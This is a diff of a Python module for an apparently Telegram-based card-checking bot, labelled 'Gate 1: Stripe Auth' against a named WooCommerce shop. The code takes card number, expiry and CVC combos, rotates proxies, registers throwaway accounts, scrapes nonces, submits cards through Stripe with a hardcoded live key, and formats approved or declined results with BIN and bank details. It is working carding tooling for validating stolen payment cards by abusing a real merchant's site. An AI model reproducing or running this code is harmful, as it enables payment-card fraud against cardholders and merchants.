@@ -1,4 +1,4 @@
-# gate.py
+# stripeauth.py - Gate 1: Stripe Auth (fancyimpress.com)
 import aiohttp
 import asyncio
 import re
@@ -7,24 +7,20 @@ import string
 import json
 import logging
 from datetime import datetime
-from colorama import Fore, init
 
-# Initialize colorama and logging
-init()
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-class StripeProcessor:
+class StripeAuthGate:
     def __init__(self):
         self.proxy_pool = []
         self.request_timeout = aiohttp.ClientTimeout(total=70)
-        # Updated Stripe key from test-subject.py
         self.stripe_key = "pk_live_51IcTUHEZ8uTrpn7wTEclyYcnuG2kTGBaDYArq5tp4r4ogLSw6iE9OJ661ELpRKcP20kEjGyAPZtbIqwg3kSGKYTW00MHGU0Jsk"
+        self.base_url = "https://fancyimpress.com"
         self.bin_cache = {}
-        self.base_url = "https://fancyimpress.com"  # Updated URL from test-subject.py
 
     def load_proxies(self):
         import os
@@ -33,7 +29,6 @@ class StripeProcessor:
                 self.proxy_pool = [line.strip() for line in f if line.strip()]
 
     def generate_random_account(self):
-        """Generate random account like in test-subject.py"""
         name = ''.join(random.choices(string.ascii_lowercase, k=20))
         number = ''.join(random.choices(string.digits, k=4))
         return f"{name}{number}@yahoo.com"
@@ -62,8 +57,8 @@ class StripeProcessor:
             logger.error(f"BIN lookup error: {str(e)}")
         return None
 
-    async def process_stripe_payment(self, combo):
-        """Main Stripe processing logic from test-subject.py"""
+    async def process_card(self, combo):
+        """Gate 1: Stripe Auth processing logic (fancyimpress.com)"""
         start_time = datetime.now()
         error_message = None
         status = "approved"
@@ -74,18 +69,15 @@ class StripeProcessor:
 
             proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
             
-            # Parse card details
             card_data = combo.split("|")
             n = card_data[0]
             mm = card_data[1]
             yy = card_data[2]
             cvc = card_data[3]
             
-            # Handle year format
             if "20" in yy:
                 yy = yy.split("20")[1]
 
-            # Headers from test-subject.py
             headers = {
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -106,7 +98,6 @@ class StripeProcessor:
             }
 
             async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
-                # Step 1: Get registration nonce
                 async with session.get(f'{self.base_url}/my-account/', headers=headers, proxy=proxy) as response:
                     response_text = await response.text()
                     nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_text)
@@ -114,7 +105,6 @@ class StripeProcessor:
                         return False, status, "Failed to get registration nonce"
                     nonce1 = nonce_match.group(1)
 
-                # Step 2: Register account
                 email = self.generate_random_account()
                 reg_data = {
                     'email': email,
@@ -143,7 +133,6 @@ class StripeProcessor:
                     if response.status != 200:
                         return False, status, "Account registration failed"
 
-                # Step 3: Get payment nonce
                 async with session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers, proxy=proxy) as response:
                     response_text = await response.text()
                     payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response_text)
@@ -151,7 +140,6 @@ class StripeProcessor:
                         return False, status, "Failed to get payment nonce"
                     payment_nonce = payment_nonce_match.group(1)
 
-                # Step 4: Create Stripe payment method
                 stripe_headers = {
                     'accept': 'application/json',
                     'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -209,7 +197,6 @@ class StripeProcessor:
                     
                     payment_method_id = stripe_json['id']
 
-                # Step 5: Add payment method to account
                 headers = {
                     'Accept': '*/*',
                     'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -274,78 +261,42 @@ class StripeProcessor:
             error_message = f"System error: {str(e)}"
             return False, status, error_message
 
-    # Response formatting methods
     async def format_approval_message(self, combo, bin_info, check_time, user):
         bin_info = bin_info or {}
+        username = f"@{user.username}" if user.username else user.full_name
         return f"""
-<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝✅</b>
+<b>FN Checker</b>
+- - - - - - - - - - - - - - - - - - - - - - - -
+[⌯] <b>Card</b> ⌁ <code>{combo}</code>
+[⌯] <b>Status</b> ⌁ Approved ✅
+[⌯] <b>Result</b> ⌁ Card Added Successfully
 
-[ϟ]𝘾𝘼𝙍𝘿 -» <code>{combo}</code>
-[ϟ]𝙎𝙏𝘼𝙏𝙐𝙎 -» 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
-[ϟ]𝙂𝘼𝙏𝙀𝙒𝘼𝙔 -» <code>𝐒𝐭𝐫𝐢𝐩𝐞</code>
-<b>[ϟ]𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 -»: <code>Authenticated Successfully</code></b>
+[⌯] <b>Bin</b> ⌁ {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}
+[⌯] <b>Bank</b> ⌁ {bin_info.get('bank', 'N/A')}
+[⌯] <b>Country</b> ⌁ {bin_info.get('country', 'N/A')} {bin_info.get('country_flag', '')}
 
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-
-[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} 💳
-[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} 🏛
-[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}
-
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-
-[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
-[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
-[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
-[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
-"""
-
-    async def format_3d_secure_message(self, combo, bin_info, check_time, user):
-        bin_info = bin_info or {}
-        return f"""
-<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅</b>
-
-[ϟ]𝗖𝗮𝗿𝗱 -» <code>{combo}</code>
-[ϟ]𝗦𝘁𝗮𝘁𝘂𝘀 -» 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 3D ✅
-[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Stripe Auth
-[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Authentication Required 3d✅
-
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-
-[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} 💳
-[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} 🏛
-[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}
-
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-
-[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
-[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
-[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
-[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
+[⌯] <b>Gate</b> ⌁ Stripe Auth
+[⌯] <b>Time</b> ⌁ {check_time:.2f}s
+[⌯] <b>Used By</b> ⌁ {username}
+- - - - - - - - - - - - - - - - - - - - - - - -
 """
 
     async def format_declined_message(self, combo, bin_info, check_time, error_message, user):
         bin_info = bin_info or {}
-        card_type_emoji = "💳"
-        bank_emoji = "🏛"
-        
+        username = f"@{user.username}" if user.username else user.full_name
         return f"""
-<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</b>
+<b>FN Checker</b>
+- - - - - - - - - - - - - - - - - - - - - - - -
+[⌯] <b>Card</b> ⌁ <code>{combo}</code>
+[⌯] <b>Status</b> ⌁ Declined ❌
+[⌯] <b>Result</b> ⌁ {error_message or 'Your card was declined.'}
 
-[ϟ]𝗖𝗮𝗿𝗱 -» <code>{combo}</code>
-[ϟ]𝗦𝘁𝗮𝘁𝘂𝘀 -» Declined ❌
-[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Stripe Auth
-[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» <code>{error_message or 'Your card was declined.'}</code>
+[⌯] <b>Bin</b> ⌁ {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}
+[⌯] <b>Bank</b> ⌁ {bin_info.get('bank', 'N/A')}
+[⌯] <b>Country</b> ⌁ {bin_info.get('country', 'N/A')} {bin_info.get('country_flag', '')}
 
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-
-[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} {card_type_emoji}
-[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} {bank_emoji}
-[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}
-
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-
-[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
-[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
-[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
-[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
+[⌯] <b>Gate</b> ⌁ Stripe Auth
+[⌯] <b>Time</b> ⌁ {check_time:.2f}s
+[⌯] <b>Used By</b> ⌁ {username}
+- - - - - - - - - - - - - - - - - - - - - - - -
 """
